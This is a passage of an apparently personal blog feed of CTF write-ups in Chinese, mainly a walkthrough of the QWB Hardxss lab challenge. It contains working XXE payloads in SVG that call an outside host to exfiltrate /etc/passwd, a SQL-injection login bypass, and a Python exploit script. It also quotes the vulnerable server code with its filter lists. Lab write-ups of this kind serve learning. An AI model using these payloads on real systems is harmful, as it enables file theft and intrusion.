href="https://www.cnblogs.com/tomyyyyy/p/11122814.html#:~:text=Image%E6%A8%A1%E5%9D%97%E6%98%AF%E5%9C%A8Python,PIL%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E5%9B%BE%E5%83%8F%E8%BF%9B%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E7%9A%84%E5%8A%9F%E8%83%BD%E5%9F%BA%E6%9C%AC%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%8E%E6%AD%A4%E6%A8%A1%E5%9D%97%E5%86%85%E3%80%82">https://www.cnblogs.com/tomyyyyy/p/11122814.html#:~:text=Image%E6%A8%A1%E5%9D%97%E6%98%AF%E5%9C%A8Python,PIL%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E5%9B%BE%E5%83%8F%E8%BF%9B%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E7%9A%84%E5%8A%9F%E8%83%BD%E5%9F%BA%E6%9C%AC%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%8E%E6%AD%A4%E6%A8%A1%E5%9D%97%E5%86%85%E3%80%82</a></p><h2 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h2><p>stegsolve打开左右调通道</p><p><img src="https://img-blog.csdnimg.cn/fabd3eaa5f5947538da8ade72471b3b8.png" alt="在这里插入图片描述"></p><p>慢慢试25次。</p><h2 id="Recording"><a href="#Recording" class="headerlink" title="Recording"></a>Recording</h2><p>看了wp，要用到MacroRecorder工具，做misc还是得搜索引擎用的好呀，百度还是不太行。可以查到mrf文件格式大致是一个画图用的，鼠标宏类似的，中间还整的有虚拟键盘，打印出来了一个网址，输进去要密码，但事件最后给了密码，输进去就出了。思路是这样，关键还是得找到那个工具，</p><h3 id="Namecheck"><a href="#Namecheck" class="headerlink" title="Namecheck"></a>Namecheck</h3><p>这题社工题了，看看wp就行了。。</p><h2 id="ASCII-Terminal"><a href="#ASCII-Terminal" class="headerlink" title="ASCII Terminal"></a>ASCII Terminal</h2><h2 id="LX-100"><a href="#LX-100" class="headerlink" title="LX-100"></a>LX-100</h2><p>打开流量，先看看常规的协议HTTP啥的</p><p><img src="https://img-blog.csdnimg.cn/d754955bca1a441a8ac7a7b50fae85bf.png" alt="在这里插入图片描述"></p><p>谷歌可以查到是Lumix GX80 摄像头，其视频流通过udp传输。把udp追踪流dump下来（原始数据）直接保存为<code>mjpeg</code>，<code>VLC media player</code>就能播放。</p><p>或者可以写脚本，原始数据有很多图片<code>FFD8</code>开头，将每张图提取出来。</p><h2 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h2><h2 id="Future-Tech"><a href="#Future-Tech" class="headerlink" title="Future Tech"></a>Future Tech</h2>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWB_Hardxss</title>
    <link href="/2021/07/23/2021-7-23-QWB_Hardxss%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/07/23/2021-7-23-QWB_Hardxss%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="QWB-Hardxss"><a href="#QWB-Hardxss" class="headerlink" title="QWB_Hardxss"></a>QWB_Hardxss</h1><p>这道题属实超出了自己的知识范围，很多东西不是很懂，前几天先把XML，DTD的基础知识看了下，再来看这题，但还是有些云里雾里，太菜了。</p><p>入手只有登录可以进去，简单测试了下，很明显发现一些注入关键词被过滤掉了，然后试试万能密码<code>admin&#39;or(1=1)#</code>抓包发现返回了cookie，但还是登陆不上。</p><p><img src="https://img-blog.csdnimg.cn/0e82937ad3d8403292b8208410f70390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在js中手动设置cookie,<code>document.cookie=&quot;PHPSESSID=utf3df914s2ira67rnoeifom10&quot;</code></p><p>登录成功后，可以看到一个上传界面</p><p><img src="https://img-blog.csdnimg.cn/60c4ef1ebc4443e4a7d0dce5ca7f0d85.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后就只能对着WP做了，因为自己还没接触过XXE注入。</p><p>根据登录界面的提示<code>外部引用</code>，<code>矢量图</code>，则可以想到使用svg来上传图片，进行XXE注入</p><p><img src="https://img-blog.csdnimg.cn/509ed1ee600344329a5a3ba36a62d433.png" alt="在这里插入图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">secret</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://39.107.239.30:80/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">visit_hacker</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://39.107.239.30:80/xxe.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%visit_hacker;</span><br><span class="hljs-meta">%hacker;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hacker</span>&gt;</span><span class="hljs-symbol">&amp;sending;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hacker</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>1.php中为</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd&quot;</span>;<br><br></code></pre></div></td></tr></table></figure><p>xxe.dtd中为</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">hacker</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY sending SYSTEM &#x27;%secret;&#x27;&gt;&quot;</span>&gt;</span> <br>这个地方最开始不小心在secret前面加了个/，一直没发现浪费了贼多时间<br></code></pre></div></td></tr></table></figure><p>不知道是不是buu环境的问题，上传的svg一直显示<code>Not Image!</code>。直接拿wp读取到的源码先看看吧。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-comment">// ini_set(&quot;display_errors&quot;,&quot;off&quot;);</span><br><span class="hljs-comment">// error_reporting(0);</span><br><span class="hljs-keyword">if</span>(!array_key_exists(<span class="hljs-string">&quot;login&quot;</span>,<span class="hljs-variable">$_SESSION</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login first&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;login&quot;</span>]===<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login first&quot;</span>);<br>&#125;<br><span class="hljs-variable">$encode</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>];<br><span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$encode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)!=<span class="hljs-string">&quot;data:&quot;</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You!Hacker!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$decode</span>=file_get_contents(<span class="hljs-variable">$encode</span>);<br><span class="hljs-comment">// var_dump($decode);</span><br><span class="hljs-keyword">if</span>(!(substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;\xFF\xD8&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;BM&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)==<span class="hljs-string">&quot;\x89\x50&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;GI&quot;</span>))&#123;<br>    <span class="hljs-comment">// libxml_disable_entity_loader(true);</span><br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$res</span>=<span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$decode</span>,LIBXML_DTDLOAD);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Image!&quot;</span>);<br>    <span class="hljs-variable">$decode1</span>=<span class="hljs-variable">$dom</span>-&gt;saveXML();<br>    <span class="hljs-comment">// highlight_string($deocde1);</span><br>    <span class="hljs-comment">//防止本地文件读取</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/file:|data:|zlib:|php:\/\/stdin|php:\/\/input|php:\/\/fd|php:\/\/memory|php:\/\/temp|expect:|ogg:|rar:|glob:|phar:|ftp:|ssh2:|bzip2:|zip:|ftps:/i&quot;</span>,<span class="hljs-variable">$decode1</span>,<span class="hljs-variable">$matches</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;unsupport protocol: &quot;</span>.<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\/var|\/etc|\.\.|\/proc/i&quot;</span>,<span class="hljs-variable">$decode1</span>,<span class="hljs-variable">$matches</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal URI: &quot;</span>.<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>    <span class="hljs-variable">$res</span>=<span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$decode</span>,LIBXML_NOENT);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Image!&quot;</span>);<br>    <span class="hljs-variable">$decode</span>=<span class="hljs-variable">$dom</span>-&gt;saveXML();<br>    <br>    <span class="hljs-comment">// highlight_string($decode);</span><br>    <span class="hljs-comment">//防止xss</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/script|object|embed|onload\s*=/i&quot;</span>,<span class="hljs-variable">$decode</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no script!&quot;</span>);<br>    <span class="hljs-comment">// $encode=&quot;data:image/svg+xml;base64,&quot;.base64_encode($decode);</span><br>&#125;<br><span class="hljs-variable">$filename</span>=md5(rand());<br>file_put_contents(<span class="hljs-string">&quot;../upload/&quot;</span>.<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$decode</span>);<br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/upload/&#x27;</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$con</span>=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;select img from avatar where userid=<span class="hljs-subst">$_SESSION</span>[login]&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;fetch_row())&#123;<br>        <span class="hljs-comment">// echo &quot;update avatar set img=&#x27;$filename&#x27; where userid=$_SESSION[login]&quot;;</span><br>        <span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;update avatar set img=&#x27;<span class="hljs-subst">$filename</span>&#x27; where userid=<span class="hljs-subst">$_SESSION</span>[login]&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>!==<span class="hljs-literal">TRUE</span>)&#123;<br>            <span class="hljs-comment">// echo $con-&gt;error;</span><br>            <span class="hljs-variable">$con</span>-&gt;close();<br>        &#125;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;update success&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;insert into avatar values(<span class="hljs-subst">$_SESSION</span>[login],&#x27;<span class="hljs-subst">$filename</span>&#x27;)&quot;</span>);<br><span class="hljs-variable">$con</span>-&gt;commit();<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;upload success&quot;</span>);<br><br><br></code></pre></div></td></tr></table></figure><p>对于上传的图像文件，对于png、jpg、bmp、gif直接读文件头识别出来后转存，对于其他文件头的按svg进行解析，解析失败的认为不是有效的图像文件返回not image。并且对xml进行了两次（不是两步）解析，第一次解析的时候<code>loadxml(LIBXML_DTDLOAD)</code>，没有LIBXML_DTDVAILD不会从参数实体文件读取内容(%file 不会被读入，如下图所示)，能够防止被本地文件被读取，也能防止js被外部引入。</p><p>这个要注意的是外带数据的如果是参数实体，要注意你服务器返回的得是合法的xml或者空白。</p><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>通过<code>serviceWorker</code>来截取浏览器的请求，借鉴了西湖论剑的那个题解，西湖的那个题解现在我也看不懂….</p><h3 id="Service-Worker简介"><a href="#Service-Worker简介" class="headerlink" title="Service Worker简介"></a>Service Worker简介</h3><ul><li>Appcache用来处理网站的离线缓存，可以通过manifest文件指定浏览器缓存哪些文件以供离线访问。但Appcache有相当多的缺陷，对于整站中的多页缓存来说支持比较差，而Service Worker用来作为其替代。</li><li>Service Worker是浏览器在后台运行的脚本，与web页面分离，以更好地支持不需要web页面或用户交互的功能。也可以将其理解为一个介于客户端和服务端之间的代理服务器，拥有<strong>拦截请求、修改返回内容</strong>的权力。可以用来缓存并处理离线网页（用来XSS）。</li><li>Service Workers 要求<strong>必须在 HTTPS 下才能运行</strong>。为了便于本地开发，<strong>localhost</strong> 也被浏览器认为是安全源。</li><li>Service Workers<strong>没有访问 DOM 的能力</strong>。</li></ul><p>剩下的放张图，属实对xss这一快还不太会</p><p><img src="https://img-blog.csdnimg.cn/0c542dea2e5240bd9a145042b677df13.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>这是借鉴天枢的解法</p><p>直接拿exp吧，中间有我很多尝试的svg</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span>  re<br><span class="hljs-keyword">import</span>  base64<br>url = <span class="hljs-string">&#x27;http://7f02f7e5-c929-4078-9f06-5e6c4acea6db.node4.buuoj.cn/&#x27;</span><br>svg = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE ANY[</span><br><span class="hljs-string">&lt;!ENTITY % secret SYSTEM &quot;http://39.107.239.30:80/1.php&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY % visit_hacker SYSTEM &quot;http://39.107.239.30:80/xxe2.xml&quot;&gt;</span><br><span class="hljs-string">%visit_hacker;</span><br><span class="hljs-string">%hacker;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;hacker&gt;&amp;sending;&lt;/hacker&gt;&quot;&quot;&quot;</span><br>svg2 = <span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE message [</span><br><span class="hljs-string">    &lt;!ENTITY % remote SYSTEM &quot;http://39.107.239.30:80/dtd&quot;&gt;  </span><br><span class="hljs-string">    %remote;</span><br><span class="hljs-string">    %start;</span><br><span class="hljs-string">    %send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="hljs-string">&lt;/svg&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># b&quot;&quot;&quot;&lt;!-- test.jpg --&gt;</span><br><span class="hljs-comment"># &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="hljs-comment"># &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="hljs-comment"># &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="hljs-comment"># &lt;html&gt;</span><br><span class="hljs-comment"># &lt;head&gt;&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;&lt;/head&gt;</span><br><span class="hljs-comment"># &lt;body&gt;</span><br><span class="hljs-comment"># &lt;svg style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1);&quot;&gt;&lt;/svg&gt;</span><br><span class="hljs-comment"># &lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-comment"># &lt;/xsl:template&gt;</span><br><span class="hljs-comment"># &lt;/xsl:stylesheet&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># &quot;&quot;&quot;</span><br>svg3 = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE svg [</span><br><span class="hljs-string">&lt;!ELEMENT svg ANY &gt;</span><br><span class="hljs-string">&lt;!ENTITY % sp SYSTEM &quot;http://39.107.239.30:80/xxe.xml&quot;&gt;</span><br><span class="hljs-string">%sp;</span><br><span class="hljs-string">%param1;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;svg viewBox=&quot;0 0 200 200&quot; version=&quot;1.2&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; style=&quot;fill:red&quot;&gt;</span><br><span class="hljs-string">      &lt;text x=&quot;15&quot; y=&quot;100&quot; style=&quot;fill:black&quot;&gt;XXE via SVG rasterization&lt;/text&gt;</span><br><span class="hljs-string">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; rx=&quot;10&quot; ry=&quot;10&quot; width=&quot;200&quot; height=&quot;200&quot; style=&quot;fill:pink;opacity:0.7&quot;/&gt;</span><br><span class="hljs-string">      &lt;flowRoot font-size=&quot;15&quot;&gt;</span><br><span class="hljs-string">         &lt;flowRegion&gt;</span><br><span class="hljs-string">           &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;200&quot; height=&quot;200&quot; style=&quot;fill:red;opacity:0.3&quot;/&gt;</span><br><span class="hljs-string">         &lt;/flowRegion&gt;</span><br><span class="hljs-string">         &lt;flowDiv&gt;</span><br><span class="hljs-string">            &lt;flowPara&gt;&amp;exfil;&lt;/flowPara&gt;</span><br><span class="hljs-string">         &lt;/flowDiv&gt;</span><br><span class="hljs-string">      &lt;/flowRoot&gt;</span><br><span class="hljs-string">&lt;/svg&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>s = requests.Session()<br>s.cookies[<span class="hljs-string">&quot;PHPSESSID&quot;</span>]= <span class="hljs-string">&quot;PHPSESSID=9nas0jatppeftralq58d60apre&quot;</span><br>res = s.post(url+<span class="hljs-string">&#x27;login/login.php&#x27;</span>,<br>             data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&#x27;or(1=1)#&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;,<br>             headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><br>res2 = s.post(url=url+<span class="hljs-string">&#x27;user/upload.php&#x27;</span>,<br>              data=&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">b&quot;data:image/svg+xml;base64,&quot;</span>+base64.b64encode(svg2)&#125;,<br>              cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(res2.text)<br><span class="hljs-built_in">print</span>(base64.b64encode(svg))<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res2.text:<br>    exit(<span class="hljs-number">1</span>)<br>res3 = s.get(url=url+<span class="hljs-string">&#x27;user/&#x27;</span>,cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><span class="hljs-comment"># print(res3.text)</span><br><br>u = re.findall(<span class="hljs-string">r&#x27;&lt;embed id=&quot;prebox&quot; src=&quot;\/upload\/([0-9a-zA-z]+)&quot;&#x27;</span>,res3.text)<br>u = <span class="hljs-string">&quot;upload/&quot;</span>+u[<span class="hljs-number">0</span>]<br><br>res4 = s.get(url=url+u).text<br><span class="hljs-built_in">print</span>(res4)<br><br><br><br><br><br></code></pre></div></td></tr></table></figure><p>后面改了一下脚本竟然拿到了，真是太不容易了，才发现好像不一定是非要<code>sucesss</code>才行。</p><p><img src="https://img-blog.csdnimg.cn/4e93e126baa046e091b1f44aa092420a.png" alt="在这里插入图片描述"></p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;script &gt;<br><span class="hljs-built_in">document</span>.domain=<span class="hljs-string">&quot;cubestone.com&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pageload</span>(<span class="hljs-params">data</span>)</span>&#123;<br>    <span class="hljs-built_in">document</span>.body.innerText=data;<br>&#125;<br>fetch(<span class="hljs-string">`loader.php?callback=pageload&amp;secret=cube`</span>).then(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;<span class="hljs-keyword">return</span> res.text();&#125;).then(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>&#123;<span class="hljs-built_in">eval</span>(data);&#125;)&lt;/script&gt;<br><br></code></pre></div></td></tr></table></figure><p>拿到<code>upload.php</code>源码</p><p><img src="https://img-blog.csdnimg.cn/153fad9a5b104fbe97463dc162a71b5b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接着又试了下天枢的那个方法，通了，太痛苦了呜呜呜，是我xml中的dtd中有个地方多写了个<code>/</code>，啊这题看了两天太痛苦了。</p><p>读到了<code>/etc/passwd</code></p><p><img src="https://img-blog.csdnimg.cn/0641ecd64f854cd5a2a416bd2bc10752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>到这就实现了任意文件读取了~~</p><p><img src="https://img-blog.csdnimg.cn/91ab5f2234bf4317bf61d64f06e0c848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" 